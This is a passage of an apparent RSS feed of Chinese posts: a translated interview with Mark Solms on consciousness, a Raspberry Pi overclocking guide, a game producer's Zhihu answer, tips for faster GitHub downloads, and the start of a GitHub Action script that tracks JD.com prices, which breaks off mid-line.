·塞尔所说：“大脑是如何跨越从电化学到感觉的鸿沟的呢？”</b></blockquote>\n<p><b>索尔姆斯：</b>我认为，我们把人类意识作为所谓意识的模型，是把这个问题困难化了。（塞尔）这个问题听起来更奇妙。所有这些思考、感受和哲学思辨怎么可能都是脑细胞的产物呢？不过我们应该从感觉这种更基础的意识雏形开始讨论。<b>即把意识看作只和存在价值有关的东西：生存是好事，死亡是坏事。这是所有生物的基本价值体系。</b>糟糕的感觉意味着我不太好——我很饿、很渴、很困，我受到生命存亡和肢体受损的威胁；而好的感觉则有相反的意味——当前状况有利于我的生存和繁衍。</p>\n<blockquote><b>你是说意识本质上是关于感觉的，而非认知或智力。</b></blockquote>\n<p><b>索尔姆斯：</b>这就是为什么我说“从意识最基本的形式开始讨论”更有助于解决你提出的问题。一个物质生物怎么会拥有意识这种神秘又奇妙的东西呢？把意识简化为更生物性的东西，比如基本的感觉，然后我们才能开始在之上构建复杂性。朝着这个方向迈出的第一步是“我感觉”，之后才有了问题：这种感觉是如何产生的？这个感觉是关于什么的？然后我们有了最初的认知——“关于这一事我有这样一种感觉”。于是，<b>感觉延伸到了知觉，以及世界上有机体的其它认知表征</b>（representation）<b>上。</b></p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-8a3dfad0f8b2d355082c67e853c506ce_b.jpg\" data-size=\"normal\" data-rawwidth=\"805\" data-rawheight=\"1117\" class=\"origin_image zh-lightbox-thumb\" width=\"805\" data-original=\"https://pic3.zhimg.com/v2-8a3dfad0f8b2d355082c67e853c506ce_r.jpg\"><figcaption>- Anxo Vizcaíno -</figcaption></figure><h2><b>感觉、意识与记忆</b></h2>\n<blockquote><b>这些感觉源自大脑的什么地方？</b></blockquote>\n<p><b>索尔姆斯：感觉起源于</b>大脑中一个非常古老的部位——<b>脑干上部</b>，这个部位是我们和所有脊椎动物共有的。大脑的这个部分已经有5亿年的历史了。非常明显的事实是，这些结构的损伤——<b>在网状激活系统的某些部分中，小到火柴头大小的损伤——会使所有意识消失</b>。仅这一事实就足以证明，更复杂的认知意识依赖于上脑干产生的意识的基本情感形式。</p>\n<blockquote><b>所以我们把过多注意力放在了大脑皮层上，我们赞美它，因为它让人类变得聪明。</b></blockquote>\n<p><b>索尔姆斯：</b>确实。人类对自身在演化中所处的位置感到骄傲：唯独哺乳动物拥有宽阔的大脑皮层，而我们人类的大脑皮层面积甚至更大。这是我们在意识神经科学史上所犯下的最大错误。<b>关于大脑皮层是意识来源的证据非常薄弱。</b>如果你把一只新生哺乳动物——比如一只小鼠——去皮质化，它不会丧失意识。它不仅早上会醒来，晚上去睡觉，它还会跑来跑去、挂在栏杆上、游泳、吃东西、交配、玩耍、把幼崽抚育养大。<b>所有这些情感行为离开了大脑皮层依旧存在。</b></p>\n<p>人类也一样。<b>生来就没有大脑皮层的儿童，被称为脑发育不全性脑积水（不要和脑积水混淆）</b>，与我刚才描述的这些实验动物的情况完全一样。他们早上醒来，晚上入睡，高兴时微笑，沮丧时大吵大闹。当然了，我们没法跟他们讲话，因为他们没有大脑皮层。他们不能告诉我他们有意识，但会像我们的宠物一样表现出意识和感觉。</p>\n<blockquote><b>你是说我们确实有两个大脑——脑干和大脑皮层。</b></blockquote>\n<p><b>索尔姆斯：</b>是的，但大脑皮层本身无法产生意识。可以说，大脑皮层从脑干中借用了意识。此外，意识并非大脑皮层所固有的。大脑皮层可以进行高水平且独特的人类认知操作，比如阅读理解，而根本不需要意识。所以为什么我们还会有意识呢？答案是我们需要感觉来进行认知，因为这是价值的来源。事情进展得好还是不好？所有选择、所有决策，都需要建立在一个价值体系中，建立在一物优于另一物的价值观之上。</p>\n<blockquote><b>所以思维是什么呢？我们还能谈论思想的神经化学（本质）吗？</b></blockquote>\n<p><b>索尔姆斯：</b>思想的最基本形式关乎选择。<b>发生在我们日常的心理生活中的大部分认知过程，都是在无意识中进行的。</b>如果我们不需要做出选择，那么万事自然发生。而现在我面临着两种选项，我需要选择其一来行动。意识让我们能够做出那些选择，因为它提供了价值判断。换句话说，思考在不知不觉中进行，直到我们碰见了不确定的局面，不知道该做什么。然后，我们需要感觉来解决这个问题。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-9b9681e2b729c0d794e99a8ac5774df1_b.jpg\" data-size=\"normal\" data-rawwidth=\"805\" data-rawheight=\"1206\" class=\"origin_image zh-lightbox-thumb\" width=\"805\" data-original=\"https://pic2.zhimg.com/v2-9b9681e2b729c0d794e99a8ac5774df1_r.jpg\"><figcaption>- Anxo Vizcaíno -</figcaption></figure><blockquote><b>记忆是如何融入意识的？</b></blockquote>\n<p><b>索尔姆斯：</b>一切认知的基础成分就是我们拥有的记忆。感觉印象进入我们的记忆并留下痕迹，我们便可以通过认知的形式重新激活它们，并以各种复杂的方式重新组合，包括提出新的想法。<b>但认知最基本的结构就是记忆痕迹，而大脑皮层就是一个巨型表征仓库。</b>所以我刚才说，本质上认知并非都具有意识，只是在说，很大一部分记忆都是潜藏在意识之下的。我们不可能对一生中接收的数以亿计比特的信息都有所意识，所以有意识的部分是那些从长期记忆的巨型仓库中提取而来的短期工作记忆，但它们只是所有记忆之中微小的一部分。</p>\n<blockquote><b>你说记忆的功能是预测我们未来的需求。而海马体，我们常说的大脑的记忆中心，是用来想象未来以及储存过去信息的。</b></blockquote>\n<p><b>索尔姆斯：从过去事件中学习的唯一目的，是更好地预测未来事件，这就是记忆的意义所在。</b>它不仅仅是个图书馆，来把发生在我们身上的所有事情归档。我们需要记录过去的事件，是因为这样我们才能以其作为基础，来预测未来。是的，海马体对于想象未来和回忆过去一样重要，你也可以说这是在回忆未来。</p>\n<blockquote><b>一门真正的意识科学、关于主观经验的科学，难道不能解释为什么特定的思想和记忆会突然出现在我的大脑中吗？</b></blockquote>\n<p><b>索尔姆斯：</b>当然能。这就是为什么我比大多数神经科学家都更认真对待精神分析学家的工作。他们会问，为什么史蒂夫在他人生这个阶段会有这样的经历？我大脑中的神经元是如何产生这一切的？我是说，如果从最基本的因果机制出发，我们只是在谈论一种感觉，而它们在普通的生物学术语中并不难理解。接下来，要厘清所有那些基于我们整个生活的认知——我怎么去满足我的情感需求？与此同时，我们的大脑也在不断地预测和感受问题，并试图解决它。</p>\n<blockquote><b>这就是神经精神分析的前提。解释大脑中发生的生物学现象是一条道路，另一条道路则是通过心理学的解释——也许我需要一位心理治疗师，来帮助我理解，为什么突然之间我的脑海中会冒出一个特别的想法。</b></blockquote>\n<p><b>索尔姆斯：</b>你刚刚概括总结了我的整个科学生涯。我认为两种道路我们都需要。当初驱使我去研究神经科学的，正是这些非常重要又有趣的问题，这些塑造了我的生活的复杂事物，是如何与我的身体器官相关联的？你知道的，<b>在医学院或研究生课程中，我们被灌输了这样的观念：必须丢掉那些好奇心与神秘感，丢掉对那些宏大问题的兴奋和痴迷。</b>而由于我的个人经历，我无法放弃对这些问题的好奇。这就是我做这些事的动机。</p>\n<blockquote>作者：Mark Solms | 封面：Anxo Vizcaíno<br>译者：王两 | 校对：Sixin<br>编辑：山鸡 | 排版：平原<br>原文链接：<a href=\"https://link.zhihu.com/?target=https%3A//nautil.us/issue/98/mind/consciousness-is-just-a-feeling\" class=\" external\" target=\"_blank\" rel=\"nofollow noreferrer\"><span class=\"invisible\">https://</span><span class=\"visible\">nautil.us/issue/98/mind</span><span class=\"invisible\">/consciousness-is-just-a-feeling</span><span class=\"ellipsis\"></span></a>\n</blockquote>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-d8a27c802b014a16c0e1b846ae136a03_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"667\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic4.zhimg.com/v2-d8a27c802b014a16c0e1b846ae136a03_r.jpg\"></figure><figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-6b82feaefabb4651e1806c7724f54ab7_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"667\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic4.zhimg.com/v2-6b82feaefabb4651e1806c7724f54ab7_r.jpg\"></figure><figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-3258e45ad35632a270f9b4223f5b33df_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"667\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic4.zhimg.com/v2-3258e45ad35632a270f9b4223f5b33df_r.jpg\"></figure><figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-494b041a47194ef6ec606b6f790f64ce_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"667\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic3.zhimg.com/v2-494b041a47194ef6ec606b6f790f64ce_r.jpg\"></figure><br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/neureality?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">神经现实</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br>\n","link":"http://zhuanlan.zhihu.com/p/384574582?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"树莓派超频","date":"2021-06-25 15:50:00","description":"\n<div class=\"note note-info\">            <p>本文操作系统为 Ubuntu Server 20.04，其他操作系统可能有所不同。</p>          </div>\n<div class=\"note note-warning\">            <p>超频是有风险的，温度也会更高，需要比较良好的散热。</p>          </div>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%BC%80%E5%A7%8B\" class=\"headerlink\" title=\"开始\"></a>开始</h2>\n<p>登录树莓派，进入 <code>/boot/firmware/</code> 目录：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cd</span> /boot/firmware/</span><br></pre></td></tr></table></figure><div class=\"note note-warning\">            <p>网上很多教程让你修改 <code>config.txt</code> 文件，但注释里已经很明确的写了：</p>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\"># Please DO NOT modify this file; if you need to modify the boot config, the</span><br><span class=\"line\"># \"usercfg.txt\" file is the place to include user changes. Please refer to</span><br><span class=\"line\"># the README file for a description of the various configuration files on</span><br><span class=\"line\"># the boot partition.</span><br></pre></td></tr></table></figure>\n</div>\n<p>我们修改 <code>usercfg.txt</code> 文件：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo vim usercfg.txt</span><br></pre></td></tr></table></figure><p>在文件末尾追加配置信息，以下是我的，仅供参考：</p>\n<div class=\"note note-danger\">            <p>我使用的是 <code>Raspberry Pi 4 (4GB)</code>，并且有小风扇和散热片。<br>请根据自己的需要和配置进行更改。</p>          </div>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\">force_turbo=0</span><br><span class=\"line\">arm_freq=1850</span><br><span class=\"line\">over_voltage=6</span><br><span class=\"line\">gpu_freq=650</span><br><span class=\"line\">core_freq=650</span><br><span class=\"line\">gpu_mem=620</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E9%87%8D%E5%90%AF\" class=\"headerlink\" title=\"重启\"></a>重启</h2>\n<p>保存文件，使用命令重启：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo reboot</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>重启完毕后，再使用 <code>lscpu</code> 命令看看 CPU 状况。</p>\n","link":"https://blog.yfun.top/posts/1445549919/"},{"title":"如何评价 6 月 11 日公测的《鬼泣-巅峰之战》手游？","date":"2021-06-25 15:30:08","description":"\n<p>感谢 <a class=\"member_mention\" href=\"http://www.zhihu.com/people/70c5673ee4e9644003f7a725c4a06a4e\" data-hash=\"70c5673ee4e9644003f7a725c4a06a4e\" data-hovercard=\"p$b$70c5673ee4e9644003f7a725c4a06a4e\">@知乎游戏</a>  的邀请</p>\n<blockquote>前言：大家好，我是《鬼泣-巅峰之战》（后续简称鬼泣手游）的制作人肥猫。项目自立项制作到现在已经过了3年时光，团队也从最初的100人扩展到现在的300多人，着实感慨颇多。近期也是终于开放了全平台公测，能够顺利将这部作品呈现给大家，我们内心是欣喜的。在此首先感谢各位对游戏始终如一的支持和喜爱，也感谢团队中所有人的辛苦付出，通过知乎这个平台，我也想和诸位聊一聊我对这款游戏的心里话。</blockquote>\n<p> 作为鬼泣手游的制作人，如何评价自己的游戏。我当然很想给他打100分，因为我了解这开发3年以来，游戏之中所包含的辛苦与努力。从无到有，优化调整，追进度改bug，就像呵护自己的孩子一般，从一次又一次的测试中见证它的成长。同时我也知道，它并不完美，但是我们希望通过自己的努力，让它变得更好，成为手机平台动作游戏中的佼佼者。最重要的，不负期待，不负鬼泣之名。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-bc043de6428384cffbecaf76a3140b6d_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"798\" data-rawheight=\"448\" data-watermark=\"watermark\" data-original-src=\"v2-bc043de6428384cffbecaf76a3140b6d\" data-watermark-src=\"v2-64b5600f0def519dea7d167744c072c6\" data-private-watermark-src=\"v2-9ed5594669c7422f86778ea2b3b87d16\"></p>\n<p> 能成功获得少年时最爱游戏的ip授权，还是和CAPCOM这种动作游戏领衔的公司合作，真的能让人感到热血澎湃。同时我也问了自己一个问题，“把鬼泣做成手游，应该做成什么样子？”还记得第一次测试之时，那一版的鬼泣手游还不能飞起来。我们靠着一腔热血做出来的游戏，就动作游戏而言它是合格的，但是唯独不是鬼泣，不能空中连段算什么鬼泣？于是我们进行了推翻重做，才有了现在的“皇牌空战”。</p>\n<p>鬼泣手游还不够完美，作为一个游戏行业从业者而言，它需要打磨的点还有很多。公测以来，我们收到了许多玩家的留言反馈。有的沉着冷静，有的言辞激烈，即便是做好了面对这一切的心理准备，依旧感受到我们需要做的还很多。无论是什么样的留言，都是来自鬼泣手游和这个作品系列的热情，目的都是为了让游戏变得更好。所以在此想说一句“请轻喷”，当然建议我们都会评估，还请给我们一些时间，去解决那些让大家感受不佳的问题。</p>\n<p><br></p>\n<p>《鬼泣-巅峰之战》的诞生，我们到底做了哪些努力，借此机会也想和大家分享一下。</p>\n<p>鬼泣系列是一款主机游戏，要把这款大作搬到手机平台上，势必要根据实际情况进行取舍，还要面对许多突破式的挑战。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-adac55f6a8d4cdd4e67e7d8695ad423b_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2250\" data-rawheight=\"1500\" data-watermark=\"watermark\" data-original-src=\"v2-adac55f6a8d4cdd4e67e7d8695ad423b\" data-watermark-src=\"v2-d1a6893670e81da0bd2facf76d4c6e99\" data-private-watermark-src=\"v2-f7d48bd0f6d52006342aa2565c718e37\"></p>\n<p> 对比同类型，鬼泣手游中一个角色的内容是非常的丰富，而且就技能而言，只要玩家获得了一类武器的某一个，那么武器所对应的所有技能就都可以去学习了，也可以通过各种武器的自由组合去实现更为华丽的操作，创造属于自己的连招，这一点是非常酷的。</p>\n<p>说实在话，单单就说还原《鬼泣》的战斗手感其实都是一个巨大的挑战，更不用说JC机制、踩怪弹反等特色战斗。市面上大部分手机动作游戏是没有跳跃的，而有极少数有跳跃的也没有《鬼泣》那样的踩怪JC机制。可以说在对标《鬼泣》原作操作的制作标准下，实际开发起来非常困难，涉及到很多的模块，我们需要不断的去优化调整。</p>\n<p>鬼泣手游并非是直接移植，我们在CAPCOM花了20年构筑的鬼泣大世界中进行填补，让手游的故事能够填补鬼泣世界观的空缺，也为粉丝们解答了许多设定上的未解之谜，比如“鬼泣3后维吉尔和但丁又发生了怎样的故事？”让我们的游戏真正成为鬼泣系列的新作。</p>\n<p>还有一点要说的是玩家体验方面，手游的推出让许多并不了解鬼泣系列的玩家到来，而游戏本身属于硬核向，所以在平衡新老用户的体验上做了很多功课。平衡新老用户主要是在保持机制的前提下做好数值的平衡，让老玩家能够玩的尽兴，同时新玩家也能体会到游戏的快乐。</p>\n<p>比如说我们注意到很多新用户在战斗时并不会按节奏和按键顺序来按，而是快速狂点一个按键，还有就是一直狂按输出，直到怪物抬手要攻击时又狂按闪避。我们按硬核动作游戏方式做的操作设计，反倒成了新的手游玩家体验不好的地方。所以我们在公测版本中修改了指令输入机制，还按照玩家的操作习惯把一些以前需要玩家自己学的技能放到初始技能里。这样新玩家在狂按一个键的时候也能按出实用的技能，在快要被揍的时候基本能及时闪开。</p>\n<p>未来，我们将陆续开放更多玩家之间有交互的玩法，更高画质的PC版也会上线。目前主线剧情、角色较少、游戏玩法较少、关卡难度偏低、新武器推出较慢等问题，我们一直都会关注，请相信我们会给各位一个满意的答案。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-c4ef4f204ed9371ea9eb4bafb782f6ca_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2208\" data-rawheight=\"1242\" data-watermark=\"watermark\" data-original-src=\"v2-c4ef4f204ed9371ea9eb4bafb782f6ca\" data-watermark-src=\"v2-7661d4834c34139c2649fa93f5b5e7f7\" data-private-watermark-src=\"v2-e6e94e96de396d3242c7d754645ab9bf\"></p>\n<p> 最后，再次感谢各位对于《鬼泣-巅峰之战》手游的支持，希望大家都能拥有一段热血沸腾的猎魔旅程。恶魔猎人，永不止步！</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/fei-mao-35-76?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">肥猫</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/464092167/answer/1960966612?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">86 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/296672609?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如果出一款鬼泣手游，你对它有什么期待？</a><br><a href=\"http://www.zhihu.com/question/420899122?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">怪物猎人和鬼泣这种游戏在哪个软件下载？</a><br>\n","link":"http://www.zhihu.com/question/464092167/answer/1960966612?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"订阅 YFun's Blog","date":"2021-06-20 10:30:00","description":"\n<p>自 2021 年 6 月 20 日起，本博客将同步更新 Twitter 和 Telegram 频道(由 IFTTT 提供支持)。</p>\n<ul>\n<li><a href=\"https://t.me/s/always_explore\">Telegram Channel</a></li>\n<li><a href=\"https://twitter.com/OhhhCKY\">Twitter</a></li>\n</ul>\n","link":"https://blog.yfun.top/posts/3249015232/"},{"title":"加速 GitHub 下载","date":"2021-06-18 17:30:00","description":"\n<p>GitHub 在国内的访问情况不太稳定，仓库克隆速度也非常慢。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E2%9C%88%EF%B8%8F\" class=\"headerlink\" title=\"✈️\"></a>✈️</h2>\n<p>不必多说。</p>\n<p>例如 <a href=\"http://127.0.0.1:7890/\">http://127.0.0.1:7890</a> 为代理地址，你可以使用下方的命令更改：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git config --global http.proxy http://127.0.0.1:7890</span><br></pre></td></tr></table></figure><p>如果有一天不需要了，输入下面代码取消：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git config --global --<span class=\"built_in\">unset</span> http.proxy</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#FastGit\" class=\"headerlink\" title=\"FastGit\"></a>FastGit</h2>\n<p>使用 <a href=\"https://fastgit.org/\">FastGit</a> 提供的 GitHub 镜像。</p>\n<p>镜像地址：<a href=\"https://hub.fastgit.org/\">https://hub.fastgit.org</a></p>\n<p>支持 HTTPS 克隆，并且提供 raw.githubusercontent.com 的镜像，地址为 <a href=\"https://raw.fastgit.org/\">https://raw.fastgit.org</a></p>\n<h2>\n<a href=\"https://blog.yfun.top/#CNPM\" class=\"headerlink\" title=\"CNPM\"></a>CNPM</h2>\n<p>使用 <a href=\"https://cnpmjs.org/\">CNPM</a> 提供的 GitHub 镜像。</p>\n<p>镜像地址：<a href=\"https://github.com.cnpmjs.org/\">https://github.com.cnpmjs.org</a></p>\n<p>支持 HTTPS 克隆。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#Hosts\" class=\"headerlink\" title=\"Hosts\"></a>Hosts</h2>\n<p>通过更改 Hosts 文件的方式解决，但大有可能失效：</p>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\">199.232.69.194  github.global.ssl.fastly.net</span><br><span class=\"line\">140.82.113.4    github.com</span><br></pre></td></tr></table></figure><p>GitHub 上的 <a href=\"https://github.com/521xueweihan/GitHub520\">521xueweihan/GitHub520</a> 项目提供了更多关于 GitHub Hosts 列表。</p>\n<blockquote><p><a href=\"https://github.com/521xueweihan/GitHub520/issues/53\">521xueweihan/GitHub520 #53</a></p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#Gitee\" class=\"headerlink\" title=\"Gitee\"></a>Gitee</h2>\n<p>网上挺多教程，使用 Gitee 的「从 GitHub 导入」功能。</p>\n<p>不过 Gitee 限制仓库 500MB。。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#Coding\" class=\"headerlink\" title=\"Coding\"></a>Coding</h2>\n<p>进入 Coding 控制台，点击「创建项目」。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/k7uHJm.png\"></p>\n<p>项目模版选择「代码托管」就好，仅做下载的话无需开启太多。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/bEO0vX.png\"></p>\n<p>填写项目基本信息，如名称、标识等。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/N4xjSv.png\"></p>\n<p>新建一个镜像仓库。</p>\n<p>「Git 仓库 URL」填写 GitHub 公开仓库 HTTPS 克隆地址，如：<a href=\"https://github.com/twbs/bootstrap.git\">https://github.com/twbs/bootstrap.git</a></p>\n<p>创建完成后请稍等，系统就会自动导入。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/YxnnDj.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/FmfWkf.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/OV7w4v.png\"></p>\n<p>导入完成后，点击「克隆」就能找到克隆地址。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/bWszbu.png\"></p>\n<p>克隆速度挺快的：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">Cloning into <span class=\"string\">'bootstrap'</span>...</span><br><span class=\"line\">remote: Enumerating objects: 169214, <span class=\"keyword\">done</span>.</span><br><span class=\"line\">remote: Counting objects: 100% (169214/169214), <span class=\"keyword\">done</span>.</span><br><span class=\"line\">remote: Compressing objects: 100% (51634/51634), <span class=\"keyword\">done</span>.</span><br><span class=\"line\">Receiving objects:  57% (96728/169214), 90.58 MiB | 6.83 MiB/s </span><br></pre></td></tr></table></figure><p>此外，Coding 还支持自动同步，可以设置每天的同步时间。</p>\n","link":"https://blog.yfun.top/posts/2517388641/"},{"title":"GitHub Action 监测京东商品价格","date":"2021-05-18 18:32:00","description":"\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%89%8D%E8%A8%80\" class=\"headerlink\" title=\"前言\"></a>前言</h2>\n<p>我会在京东上买些电子产品和文具，那么如何获得商品降价信息，使用更低的价格购买呢？</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%BC%80%E5%A7%8B\" class=\"headerlink\" title=\"开始\"></a>开始</h2>\n<p>新建一个 <code>GitHub</code> 仓库，创建 <code>main.py</code> , <code>notify.py</code> 和 <code>.github/workflows/auto.yml</code> 三个文件，内容如下：</p>  <details class=\"post-details\"><summary><code>main.py</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"comment\"># 导入模块</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib.request, random, json, notify</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 商品列表</span></span><br><span class=\"line\">check = [</span><br><span class=\"line\">    <span class=\"comment\"># 闪迪（SanDisk）64GB TF（MicroSD）存储卡</span></span><br><span class=\"line\">    <span class=\"string\">'1887526'</span>,</span><br><span class=\"line\">    <span class=\"comment\"># 晨光(M&amp;G)文具 0.5mm 黑色中性笔</span></span><br><span class=\"line\">    <span class=\"string\">'277393'</span></span><br><span class=\"line\"><span class=\"comment\"># ...</span></span><br><span class=\"line\">]</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 价格列表，用于临时存储获取到的价格数据</span></span><br><span class=\"line\">price = {}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 读取上次的价格文件</span></span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    file = <span class=\"built_in\">open</span>(<span class=\"string\">'./price.json'</span>, mode=<span class=\"string\">'r'</span>)</span><br><span class=\"line\">    lastPrice = json.loads(file.readlines()[<span class=\"number\">0</span>])</span><br><span class=\"line\"><span class=\"keyword\">except</span>:</span><br><span class=\"line\">    print(<span class=\"string\">\"读取文件时出现错误！\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 遍历列表，比对价格</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> itemId <span class=\"keyword\">in</span> check:</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求 URL</span></span><br><span class=\"line\">    <span class=\"comment\"># http://p.3.cn/prices/mgets?skuIds=J_</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://p.3.cn/prices/mgets?skuIds=J_{}'</span>.<span class=\"built_in\">format</span>(itemId)</span><br><span class=\"line\">    <span class=\"comment\"># User-Agent 列表</span></span><br><span class=\"line\">    ua = [<span class=\"string\">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36'</span>,<span class=\"string\">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36'</span>,<span class=\"string\">'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36 OPR/26.0.1656.60'</span>,<span class=\"string\">'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50'</span>,<span class=\"string\">'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50'</span>]</span><br><span class=\"line\">    <span class=\"comment\"># 随机获得一个 User-Agent，如不带 User-Agent 请求，就会被拒绝。</span></span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: ua[random.randint(<span class=\"number\">0</span>,<span class=\"number\">4</span>)]</span><br><span class=\"line\">    }</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求参数</span></span><br><span class=\"line\">    request = urllib.request.Request(url = url, headers = headers)</span><br><span class=\"line\">    <span class=\"comment\"># 向京东发起请求</span></span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    <span class=\"comment\"># 将获得的数据转为 JSON</span></span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    thisPrice = <span class=\"built_in\">float</span>(page_text[<span class=\"number\">0</span>][<span class=\"string\">'p'</span>])</span><br><span class=\"line\">    <span class=\"comment\"># 将价格输入至价格变量</span></span><br><span class=\"line\">    price[itemId] = thisPrice</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 尝试对比价格</span></span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> thisPrice &gt; lastPrice[itemId]:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 涨价\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\"></span><br><span class=\"line\">            print(thisPrice - lastPrice[itemId])</span><br><span class=\"line\">            notify.notify(itemId, <span class=\"number\">0</span>, thisPrice - 